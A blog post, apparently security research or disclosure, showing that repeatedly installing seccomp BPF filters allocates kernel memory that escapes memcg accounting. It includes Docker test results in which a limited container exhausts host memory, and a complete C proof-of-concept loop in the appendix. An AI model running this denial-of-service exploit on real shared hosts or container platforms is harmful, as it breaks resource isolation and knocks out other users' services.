---
title: Break Memcg Memory Limitation
date: 2020-01-11 15:24:12
tags:
- memcg
- Linux
- cgroup
- docker
---

# Environment
- linux kernel
  - 5.3.6
  - 4.19.67 (Debian)
- docker 18.09.1
- Debian 10.1

# Kmem Accounting
In Linux kernel, kernel memory allocations (`kmalloc`, `__alloc_pages_nodemask`, etc.) will be accounted by memcg if `__GFP_ACCOUNT` flag is set.

# Per-CPU Allocations
In Linux kernel, per-CPU memory is allocated by [`pcpu_alloc`](https://elixir.bootlin.com/linux/v5.3.6/source/mm/percpu.c#L1586). `pcpu_alloc` creates its own memory pool, which is not accounted by memcg.

# `seccomp` syscall
We can use `seccomp` syscall to set Berkerly Packet Filter (BPF). While setting BPF, kernel will [allocate per-CPU memory](https://elixir.bootlin.com/linux/v5.3.6/source/kernel/bpf/core.c#L114) and will [allocate memory without `__GFP_ACCOUNT`](https://elixir.bootlin.com/linux/v5.3.6/source/kernel/bpf/core.c#L77). By setting BPF for many times, we can allocate much memory without memcg accounting.

# Test on Docker
## Host
Host machine is Debian 10 on QEMU, with 1GB memory.

## run a docker container with memory limitations
``` shell
docker run --name debian --memory 100000000 --kernel-memory 50000000 debian:slim /bin/bash
```
Run a Debian container with 100MB memory limitation and 50MB kernel memory limitation.

## write program to set BPF
``` c
while (1)
  {
    /* ... */
    prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &bpf);
    /* ... */
  }
```
I find that a task can allocate up to tens of MBs, and memcg only accounts several hundreds of KBs of them.
![one task mem](/img/one_task_mem.png)

## run enough tasks to allocate almost all memory
I run 64 tasks here and allocate almost all memory (total memory is 1GB).
![alloc mem top](/img/alloc_mem_top.png)

## result
OOM killer try to kill tasks, some of my allocating tasks are killed.
![alloc task killed](/img/alloc_task_killed.png)
Finally the host shell is killed because of out of memory.
![host shell killed](/img/host_shell_killed.png)

# Appendix
## user-space program that allocates per-CPU memory
``` c
#include <unistd.h>
#include <sys/prctl.h>
#include <linux/prctl.h>
#include <linux/seccomp.h>
#include <linux/filter.h>
#include <linux/audit.h>
#include <linux/signal.h>
#include <sys/ptrace.h>
#include <stdio.h>
#include <errno.h>

int main()
{
  struct sock_filter insns[] =
    {
     {
      .code = 0x6,
      .jt = 0,
      .jf = 0,
      .k = SECCOMP_RET_ALLOW
     }
    };
  struct sock_fprog bpf =
  {
   .len = 1,
   .filter = insns
  };
  int ret;
  
  ret = prctl(PR_SET_NO_NEW_PRIVS, 1, NULL, 0, 0);
  if (ret)
    {
      printf("error1 %d\n", errno);
      return 1;
    }
  int count = 0;
  while (1)
    {
      ret = prctl(PR_SET_SECCOMP, SECCOMP_MODE_FILTER, &bpf);
      if (ret)
        {
          sleep(1);
          printf("error %d\n", errno);
        }
      else
        {
          count++;
          printf("ok %d\n", count);
        }
    }
  return 0;
}

```
